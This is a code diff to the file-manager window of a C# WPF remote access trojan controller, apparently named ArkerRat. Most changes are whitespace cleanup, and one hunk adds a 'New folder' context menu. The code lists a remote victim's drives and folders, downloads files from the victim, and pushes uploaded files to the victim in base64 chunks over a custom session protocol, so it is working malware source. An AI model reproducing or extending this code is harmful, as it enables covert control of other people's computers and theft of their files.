@@ -26,13 +26,13 @@ namespace ArkerRatWpfVersion
     /// </summary>
     public partial class File_Manager : Window
     {
-        public RATHostSession clientSession{ get; set; }
+        public RATHostSession clientSession { get; set; }
         public File_Manager(RATHostSession session)
         {
             InitializeComponent();
             clientSession = session;
             windowText.Content += " - " + clientSession.clientInfo[0];
-            clientSession.fileManagerWindowIsAlreadyOpen= true;
+            clientSession.fileManagerWindowIsAlreadyOpen = true;
             clientSession.SendData("§FileManagerStart§§FileManagerEnd§");
         }
 
@@ -45,7 +45,7 @@ namespace ArkerRatWpfVersion
 
         public async void CloseWindow(object sender, RoutedEventArgs e)
         {
-            clientSession.fileManagerWindowIsAlreadyOpen= false;
+            clientSession.fileManagerWindowIsAlreadyOpen = false;
             close = true;
             Close();
             clientSession.SendData("§FileManagerStart§close§FileManagerEnd§");
@@ -104,14 +104,14 @@ namespace ArkerRatWpfVersion
                     data = data.Replace("§drives§", string.Empty);
                     string[] disks = data.Trim(',').Split(',');
                     foreach (string s in disks)
-                    {                    
+                    {
                         Button disk = new Button();
                         disk.Background = Brushes.Transparent;
                         disk.VerticalContentAlignment = VerticalAlignment.Bottom;
 
                         Brush buttonBrush = new SolidColorBrush((Color)ColorConverter.ConvertFromString("#FF9966FF"));
                         disk.Foreground = buttonBrush;
-                        disk.BorderBrush= Brushes.Transparent;
+                        disk.BorderBrush = Brushes.Transparent;
 
                         disk.Width = 100;
                         disk.Height = 100;
@@ -119,7 +119,7 @@ namespace ArkerRatWpfVersion
                         disk.Content = s;
 
                         ImageBrush imageBrush = new ImageBrush();
-                        imageBrush.ImageSource = TryFindResource("DriveImage") as BitmapImage; 
+                        imageBrush.ImageSource = TryFindResource("DriveImage") as BitmapImage;
                         disk.Background = imageBrush;
 
                         disk.Click += new RoutedEventHandler(PathObjectClickedOn);
@@ -146,7 +146,7 @@ namespace ArkerRatWpfVersion
                             folder.BorderBrush = null;
                             // Create the image brush
                             ImageBrush imageBrush = new ImageBrush();
-                            imageBrush.ImageSource = TryFindResource("FolderImage") as BitmapImage; 
+                            imageBrush.ImageSource = TryFindResource("FolderImage") as BitmapImage;
                             folder.Background = imageBrush;
 
                             Brush buttonBrush = new SolidColorBrush((Color)ColorConverter.ConvertFromString("#FF9966FF"));
@@ -171,7 +171,7 @@ namespace ArkerRatWpfVersion
 
                     foreach (var s in files)
                     {
-                        if((s.Substring(s.LastIndexOf("\\") + 1)).Length> 0)
+                        if ((s.Substring(s.LastIndexOf("\\") + 1)).Length > 0)
                         {
                             Button file = new Button();
                             file.VerticalContentAlignment = VerticalAlignment.Bottom;
@@ -198,7 +198,7 @@ namespace ArkerRatWpfVersion
 
                             file.MouseRightButtonDown += new MouseButtonEventHandler(OpenContextMenuFile);
                             fileManager.Items.Add(file);
-                        }                     
+                        }
                     }
                     status.Content = "status";
                 }
@@ -206,15 +206,15 @@ namespace ArkerRatWpfVersion
         }
 
         private async void PathObjectClickedOn(object sender, RoutedEventArgs e)
-        {        
+        {
             Button button = ((Button)sender);
-            if (selector == button.Tag?.ToString().Replace("§file§",string.Empty) && !(button.Tag?.ToString()).Contains("§file§"))
+            if (selector == button.Tag?.ToString().Replace("§file§", string.Empty) && !(button.Tag?.ToString()).Contains("§file§"))
             {
                 await clientSession.SendData("§FileManagerStart§" + selector + "§FileManagerEnd§");
             }
             else
             {
-                selector= button.Tag.ToString().Replace("§file§",string.Empty);
+                selector = button.Tag.ToString().Replace("§file§", string.Empty);
             }
         }
 
@@ -287,7 +287,7 @@ namespace ArkerRatWpfVersion
             MenuItem item = (MenuItem)sender;
             ContextMenu menu = (ContextMenu)item.Parent;
             Button _object = (Button)menu.PlacementTarget;
-            string path = (_object.Tag.ToString()).Replace("§file§",string.Empty);
+            string path = (_object.Tag.ToString()).Replace("§file§", string.Empty);
 
             if ((_object.Tag?.ToString()).Contains("§file§"))
             {
@@ -316,8 +316,8 @@ namespace ArkerRatWpfVersion
             MenuItem item = (MenuItem)sender;
             ContextMenu menu = (ContextMenu)item.Parent;
             Button _object = (Button)menu.PlacementTarget;
-            string path = (_object.Tag.ToString()).Replace("§file§",string.Empty);
-           System.Windows.Forms.FolderBrowserDialog whereToSaveFile = new System.Windows.Forms.FolderBrowserDialog();
+            string path = (_object.Tag.ToString()).Replace("§file§", string.Empty);
+            System.Windows.Forms.FolderBrowserDialog whereToSaveFile = new System.Windows.Forms.FolderBrowserDialog();
 
             whereToSaveFile.Description = "Select a folder to save the file";
 
@@ -325,7 +325,7 @@ namespace ArkerRatWpfVersion
 
             if (result == System.Windows.Forms.DialogResult.OK)
             {
-                _path= whereToSaveFile.SelectedPath;
+                _path = whereToSaveFile.SelectedPath;
                 await clientSession.SendData("§FileManagerStart§§DF§" + path + "§FileManagerEnd§");
             }
         }
@@ -334,12 +334,12 @@ namespace ArkerRatWpfVersion
         {
             status.Content = "uploading...";
             OpenFileDialog fileExplorer = new OpenFileDialog();
-            fileExplorer.Multiselect= true;
+            fileExplorer.Multiselect = true;
             bool? result = fileExplorer.ShowDialog();
 
-            if(result == true)
+            if (result == true)
             {
-                Task.Run(() => SendFileChunks(fileExplorer.OpenFiles(), fileExplorer.FileNames));                  
+                Task.Run(() => SendFileChunks(fileExplorer.OpenFiles(), fileExplorer.FileNames));
             }
         }
 
@@ -348,19 +348,19 @@ namespace ArkerRatWpfVersion
 
             for (int i = 0; i < fileStreams.Length; i++)
             {
-                await clientSession.SendData("§FileManagerStart§§UF§§start§" + selector + fileNames[i].Substring(fileNames[i].LastIndexOf('\\')) +"§FileManagerEnd§");
+                await clientSession.SendData("§FileManagerStart§§UF§§start§" + selector + fileNames[i].Substring(fileNames[i].LastIndexOf('\\')) + "§FileManagerEnd§");
 
-                while (!clientSession.source.IsCancellationRequested) 
+                while (!clientSession.source.IsCancellationRequested)
                 {
                     byte[] buffer = new byte[8192];
                     int bytesRead = fileStreams[i].Read(buffer, 0, buffer.Length);
 
-                    if(bytesRead == 0)
+                    if (bytesRead == 0)
                     {
                         break;
                     }
 
-                    await clientSession.SendData("§FileManagerStart§§UF§" + Convert.ToBase64String(buffer, 0, buffer.Length) +"§FileManagerEnd§");
+                    await clientSession.SendData("§FileManagerStart§§UF§" + Convert.ToBase64String(buffer, 0, buffer.Length) + "§FileManagerEnd§");
                 }
                 await clientSession.SendData("§FileManagerStart§§UF§§end§§FileManagerEnd§");
             }
@@ -369,19 +369,19 @@ namespace ArkerRatWpfVersion
         private async void GoBack(object sender, RoutedEventArgs e)
         {
             fileManager.Items.Clear();
-            if(selector.Length< 5)
+            if (selector.Length < 5)
             {
                 await clientSession.SendData("§FileManagerStart§§FileManagerEnd§");
                 return;
             }
 
-            string path = selector.Substring(0, selector.LastIndexOf('\\')+1);
+            string path = selector.Substring(0, selector.LastIndexOf('\\') + 1);
             if (path.Length > 5)
             {
                 path = path.Substring(0, path.Length - 1);
             }
 
-            await clientSession.SendData("§FileManagerStart§" +path + "§FileManagerEnd§");
+            await clientSession.SendData("§FileManagerStart§" + path + "§FileManagerEnd§");
             selector = path;
 
         }
@@ -389,7 +389,7 @@ namespace ArkerRatWpfVersion
         private async void PathSearch(object sender, RoutedEventArgs e)
         {
             fileManager.Items.Clear();
-            selector =pathSearch.Text;
+            selector = pathSearch.Text;
             await clientSession.SendData("§FileManagerStart§" + pathSearch.Text + "§FileManagerEnd§");
         }
 
@@ -399,9 +399,9 @@ namespace ArkerRatWpfVersion
         public void StartDownloadingFile(string name)
         {
             download = true;
-            using (FileStream stream = new FileStream(_path+name, FileMode.Create, FileAccess.Write))
+            using (FileStream stream = new FileStream(_path + name, FileMode.Create, FileAccess.Write))
             {
-                while (!clientSession.source.IsCancellationRequested&& download)
+                while (!clientSession.source.IsCancellationRequested && download)
                 {
                     string temp = string.Empty;
                     while (!dataBuffer.TryDequeue(out temp)) ;
@@ -411,12 +411,79 @@ namespace ArkerRatWpfVersion
                 }
                 stream.Close();
             }
-            download= false;
+            download = false;
         }
 
         private async void Refresh(object sender, RoutedEventArgs e)
         {
-            await clientSession.SendData("§FileManagerStart§"+selector+"§FileManagerEnd§");
+            await clientSession.SendData("§FileManagerStart§" + selector + "§FileManagerEnd§");
+        }
+
+        private void fileManager_MouseRightButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            fileManager.ContextMenu = new ContextMenu();
+            ListBox current = (ListBox)sender;
+
+            current.ContextMenu = new ContextMenu();
+            current.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
+            current.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));
+
+            MenuItem newFolder = new MenuItem();
+            newFolder.Header = "New folder";
+            newFolder.Click += NewFolder;
+            newFolder.Icon = new Image
+            {
+                Stretch = Stretch.Uniform,
+                Source = TryFindResource("FolderImage") as BitmapImage
+            };
+
+
+
+            current.ContextMenu.Items.Add(newFolder);
+
+            current.ContextMenu.Visibility = Visibility.Visible;
+        }
+
+        private async void NewFolder(object sender, EventArgs e)
+        {
+            //TextInput toast = new TextInput("Folder name:");
+            //Window notificationWindow = new Window()
+            //{
+            //    Width = 340,
+            //    Height = 100,
+            //    Background = System.Windows.Media.Brushes.Transparent,
+            //    WindowStyle = WindowStyle.None,
+            //    AllowsTransparency = true,
+            //    Topmost = true,
+            //    ShowInTaskbar = false,
+            //    Left = this.Left,
+            //    Top = this.Top
+            //};
+
+            //notificationWindow.Content = toast;
+
+            //while (string.IsNullOrEmpty(toast.text))
+            //{
+            //    await Task.Delay(100);
+            //}
+
+            using (var openFileDialog = new System.Windows.Forms.OpenFileDialog())
+            {
+                openFileDialog.Multiselect = false;
+                openFileDialog.CheckFileExists = false;
+                openFileDialog.AddExtension = false;
+                openFileDialog.ValidateNames = false;
+                openFileDialog.Title = "Chose folder name";
+
+                if (openFileDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                {
+                    string userInput = openFileDialog.FileName;
+                    int index = userInput.LastIndexOf("\\");
+                    userInput = userInput.Substring(index+1, userInput.Length-index-1);
+                    await clientSession.SendData("§FileManagerStart§§ND§" + selector + "," + userInput + "§FileManagerEnd§");
+                    await clientSession.SendData("§FileManagerStart§" + selector + "§FileManagerEnd§");
+                }
+            }
         }
     }
 }
